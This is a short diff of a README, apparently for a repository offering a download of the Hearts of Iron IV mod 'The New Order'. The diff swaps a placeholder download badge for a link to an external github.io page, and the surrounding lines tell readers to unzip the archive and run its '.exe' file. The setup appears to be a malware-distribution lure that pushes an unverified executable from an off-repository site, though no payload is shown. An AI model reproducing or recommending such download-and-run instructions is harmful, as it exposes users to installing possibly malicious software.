@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://hoi4-the-new-order-tno.github.io/.github/)
 
 ## 📸 Overview
 ![hoi4-tno-dark-history](https://github.com/user-attachments/assets/04bee97c-76a7-478b-99d8-7d137ca9a54d)
